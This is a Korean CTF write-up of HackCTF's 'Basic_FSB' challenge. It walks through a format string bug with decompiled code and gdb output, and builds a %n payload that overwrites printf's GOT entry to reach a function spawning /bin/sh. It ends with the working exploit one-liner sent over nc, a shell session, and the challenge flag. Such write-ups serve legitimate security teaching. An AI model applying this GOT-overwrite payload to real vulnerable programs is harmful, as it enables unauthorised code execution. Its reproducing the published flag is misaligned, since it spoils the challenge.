#Basic_FSB

---

기본적인 format string bug 문제이다. 우선 ida를 이용하여 보았더니 다음과 같은 취약한 함수가 보였다.
```c
    int vuln()
    {
      char s; // [esp+0h] [ebp-808h]
      char format; // [esp+400h] [ebp-408h]
    
      printf("input : ");
      fgets(&s, 1024, stdin);
      snprintf(&format, 0x400u, &s);
      return printf(&format);
    }
```
이 코드에서는 s에 입력한 문자열을 format으로 옮긴다음 format을 실행시킨다. 이 취약한 함수 `vuln()`의 assembly code는 다음과 같다.

```assembly
gdb-peda$ pd vuln
Dump of assembler code for function vuln:
   0x0804854b <+0>:	push   ebp
   0x0804854c <+1>:	mov    ebp,esp
   0x0804854e <+3>:	sub    esp,0x808
   0x08048554 <+9>:	sub    esp,0xc
   0x08048557 <+12>:	push   0x80486b0
   0x0804855c <+17>:	call   0x80483d0 <printf@plt>
   0x08048561 <+22>:	add    esp,0x10
   0x08048564 <+25>:	mov    eax,ds:0x804a040
   0x08048569 <+30>:	sub    esp,0x4
   0x0804856c <+33>:	push   eax
   0x0804856d <+34>:	push   0x400
   0x08048572 <+39>:	lea    eax,[ebp-0x808]
   0x08048578 <+45>:	push   eax
   0x08048579 <+46>:	call   0x80483e0 <fgets@plt>
   0x0804857e <+51>:	add    esp,0x10
   0x08048581 <+54>:	sub    esp,0x4
   0x08048584 <+57>:	lea    eax,[ebp-0x808]
   0x0804858a <+63>:	push   eax
   0x0804858b <+64>:	push   0x400
   0x08048590 <+69>:	lea    eax,[ebp-0x408]
   0x08048596 <+75>:	push   eax
   0x08048597 <+76>:	call   0x8048430 <snprintf@plt>
   0x0804859c <+81>:	add    esp,0x10
   0x0804859f <+84>:	sub    esp,0xc
   0x080485a2 <+87>:	lea    eax,[ebp-0x408]
   0x080485a8 <+93>:	push   eax
   0x080485a9 <+94>:	call   0x80483d0 <printf@plt>
   0x080485ae <+99>:	add    esp,0x10
   0x080485b1 <+102>:	nop
   0x080485b2 <+103>:	leave  
   0x080485b3 <+104>:	ret    
End of assembler dump.
```

이 함수의 ret주소를 다음 `flag()`의 주소로 바꾼다면 쉘을 따낼 수 있을 것이다.
```c
    int flag()
    {
      puts("EN)you have successfully modified the value :)");
      puts(aKr);
      return system("/bin/sh");
    }
```
---


`vuln()+104`에서 break를 걸고 `vuln()`의 ret주소의 위치를 찾아보자.

```gdb
    [----------------------------------registers-----------------------------------]
    EAX: 0x5 
    EBX: 0x0 
    ECX: 0xffffffff 
    EDX: 0xf7fb7870 --> 0x0 
    ESI: 0xf7fb6000 --> 0x1b1db0 
    EDI: 0xf7fb6000 --> 0x1b1db0 
    EBP: 0xffffce68 --> 0x0 
    ESP: 0xffffce5c --> 0x8048617 (<main+42>:	moveax,0x0)
    EIP: 0x80485b3 (<vuln+104>:	ret)
    EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x80485ae <vuln+99>:	add esp,0x10
       0x80485b1 <vuln+102>:	nop
       0x80485b2 <vuln+103>:	leave  
    => 0x80485b3 <vuln+104>:	ret
       0x80485b4 <flag>:	push   ebp
       0x80485b5 <flag+1>:	mov ebp,esp
       0x80485b7 <flag+3>:	sub esp,0x8
       0x80485ba <flag+6>:	sub esp,0xc
```
이때의 esp의 주소는 0xffffce5c이다. 때문에 `vuln()`의 return address는 0xffffce5c이다.

**vuln() return address: 0xffffce5c**


또한 `flag()`의 주소는 다음과 같다.

```bash
    gdb-peda$ p flag
    $1 = {<text variable, no debug info>} 0x80485b4 <flag>
```
**flag() address: 0x80485b4**

---

필요한 정보를 모두 얻었으니 적절한 payload를 찾아보자. 

```c
    int vuln()
    {
      char s; // [esp+0h] [ebp-808h]
      char format; // [esp+400h] [ebp-408h]
    
      printf("input : ");
      fgets(&s, 1024, stdin);
      snprintf(&format, 0x400u, &s);
      return printf(&format);
    }
```
다음 코드에서 `printf()`에서 취약점이 발생하는데, 이 함수가 실행될 때의 stack상황은 다음과 같다.

**<lower\> SFP(4bytes) - printf() return address(4bytes) - format주소(4bytes) - s(1024bytes) - format(1024bytes) <higher\>**

0xffffce5c에 대입하고자 하는 주소인 0x80485b4는 134514100이기 때문에 int범위 안에 속한다. 때문에 %n을 이용해서 한번에 처리할 수 있다.

때문에 payload를 다음과 같이 짤 것이다.

**[dummy 4bytes]+[0xffffce5c]+%134514092x+%n**

134514092라는 값은 0x80485b4인 134514100에서 앞에 출력된 8bytes를 뺀 값이다.

이를 시도하려고 했지만 ASLR때문에 이 방법은 불가능하다는 것을 알게 되었다.

---

위와 비슷하지만 조금 다른 방법을 떠올려보자. 

보안기법을 보면 다음과 같다.

```bash
    gdb-peda$ checksec
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : disabled
    PIE       : disabled
    RELRO     : Partial
```
때문에 got overwrite가 가능하다.

이번에는 조금 다르게 `snprintf()`에서 format string bug를 일으켜 `printf()`의 got를 flag의 주소로 overwrite 할 것이다.

이를 위해서 필요한 정보를 찾아보자.

우선 `printf()`의 got주소는 다음과 같다.
```gdb
    gdb-peda$ p printf
    $2 = {<text variable, no debug info>} 0x80483d0 <printf@plt>
    gdb-peda$ x/i 0x80483d0
       0x80483d0 <printf@plt>:	jmp DWORD PTR ds:0x804a00c
```
**printf() got address: 0x804a00c**

그리고 `flag()`의 주소는 다음과 같음을 위에서 알 수 있었다.

**flag() address: 0x80485b4**

---

이제 다시 적절한 payload를 짜보자.
```c
    int vuln()
    {
      char s; // [esp+0h] [ebp-808h]
      char format; // [esp+400h] [ebp-408h]
    
      printf("input : ");
      fgets(&s, 1024, stdin);
      snprintf(&format, 0x400u, &s);
      return printf(&format);
    }
```
다음과 같은 코드에서 `snprintf()`가 실행될 때의 stack상황은 다음과 같다.

**<lower\> SFP(4bytes) - snprintf() return address(4bytes) - format address(4bytes) - 0x400u(4bytes) - s address(4bytes) - format(1024bytes) - s(1024bytes) <higher\>**

0x80485b4를 십진수로 변환하면 134514100이기 때문에 다음과 같이 payload를 짤 수 있다.

**0x804a00c + %134514096x + %$257n**

134514096이라는 숫자는 0x80485b4를 십진수로 변환한 134514100에서 앞에 나온 4bytes를 뺀 값이다. 또한 %$257n은 stack상황에서 s address와 s의 위치가 1024bytes 차이가 나기 때문에 다음과 같이 지정해야 257번째 인자의 위치가 0x804a00c가 된다.
```bash
    sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/3.Basic_FSB$ (python -c "print '\x0c\xa0\x04\x08'+'%134514096x'+'%$257n'";cat) | nc ctf.j0n9hyun.xyz 3002
    input : EN)you have successfully modified the value :)
    KR)#값조작 #성공적 #플래그 #FSB :)
    pwd
    /home/attack
    ls
    flag
    main
    cat flag
    HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}
```
**flag: HackCTF{여보게\_오늘\_반찬은\_포맷스트링이\_어떠한가?}**
    
